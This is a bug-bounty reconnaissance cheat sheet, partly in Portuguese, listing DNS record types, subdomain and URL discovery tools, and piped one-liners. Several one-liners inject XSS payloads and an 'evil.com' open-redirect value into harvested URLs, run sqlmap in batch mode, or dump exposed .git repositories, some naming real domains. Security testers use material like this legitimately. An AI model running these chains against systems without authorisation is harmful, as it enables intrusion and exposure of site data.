## DNS

- A -> ipv4
- AAAA -> ipv6
- CNAME -> domains
- TXT -> notes/text
- MX -> email servers
- SOA -> domains validations
- NS -> authority servers

### dig 

- https://www.cyberciti.biz/faq/linux-unix-dig-command-examples-usage-syntax/
- https://www.thegeekstuff.com/2012/02/dig-command-examples/
- https://www.hostinger.com/tutorials/how-to-use-the-dig-command-in-linux/


### Historico de subdomain

- securitytrails.com
- subdomainfinder.c99.nl
- web.archive.org
- dnsdumpster.com
- github.com/Screetsec/Sudomy

## Subdomain enum

### brute-force

- sublist3r
- subbrute
- amass

### certs e passivos

- subfinder
- certspotter
- ctfr (crt.sh)
- chaos.projectdiscovery.io

``` $ subfinder -d domain.com -silent | httpx -status | gau ```

## URL Discovery 

- gau
- hakrawler
- wfuzz
- ffuf
- dirsearch

``` $ cat domains.txt | httpx -status | gau ```

## Content Discovery

- httpx
- aquatone
- SecretFinder

``` $ cat domains.txt | httpx -status -ports 80,443,8080 -path /admin ``` 

``` $ subfinder -d domain.com -silent | aquatone ```  

## Parameter discovery

- ParamSpider
- gf
- Parht
- kxss
- gxss

``` $ python3 paramspider.py -d | kxss ```

``` $ wfuzz -c -w burp-parameter-name.txt http://domain/index.php?FUZZ=test ```
``` $ wfuzz -c -w burp-parameter-name.txt http://domain/index.php?search=FUZZ ```

## OneLiners

#### enum javascript

 ``` $ echo tesla.com | gau | subjs ```
 
 ``` $ echo tesla.com | gau | grep -iE '\.js' ```
 
 ``` $ cat tesla | httpx -status-code -mc 200 -content-type | grep 'application/json' ```
 
 ``` $ cat tesla | httpx -status-code -mc 200 | anew ```

#### xargs (carrega lista para uma tool)
 
 https://linuxhandbook.com/xargs-command/

 ``` $ xargs -a lista -I@ sh -c 'python3 paramspider.py -d "@"' ```

#### cs.github
 
 https://github.blog/2021-12-08-improving-github-code-search/


#### git exposed

 ``` $ echo domain.com | subfinder -silent | httpx -silent | anew file ```
 
 ``` $ echo domain.com | subfinder -silent | xargs -I@ sh -c 'goop @ -f' ```

 https://github.com/arthaud/git-dumper
 https://github.com/nyancrimew/goop
 
#### Open Redirect

 https://github.com/tomnomnom/qsreplace
 
 ``` $ waybackurls domain.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done ```


#### send notifications to multiple places 

https://github.com/projectdiscovery/notify

https://crontab-generator.org/

#### port scan

 https://github.com/j3ssie/sdlookup
 
 ``` $ echo domain.com | subfinder -silent | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool' ```
 
 
 ``` $ echo doamin.com | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool' ```
 
 
#### find xss with hakrawler

 https://github.com/hakluke/hakrawler

 ``` $ echo domain.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep -v 'Not' ``` 
 
#### SQLi

 https://github.com/Findomain/Findomain

 ``` $ findomain -t domain.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1 ```
 
 
#### XSS with gau 

 https://github.com/s0md3v/uro

 ``` $ echo domain.com | gau | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss - payload "confirm(1)" | grep -v 'Not' ```
 
 ``` $ echo domain.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss - payload "confirm(1)" ```
 
 
#### Subdomain enum with JLDC

 https://github.com/brunosergi0/curlmeallsubdomains
 https://github.com/Fadavvi/Sub-Drill/blob/master/Sub-Drill.sh

 ``` $ curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?((\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew file" ```
 

#### xss with freq

 https://github.com/takshal/freq

 ``` $ echo domain.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror-alert(1);>' | freq | grep -v 'Not' ```

## Automation 

- https://github.com/KingOfBugbounty/DockerHunt

- https://hub.docker.com/r/mswell/hacktools

``` $ echo domains | gau | hakcheckurl | grep -v '404|999|403|500' ```
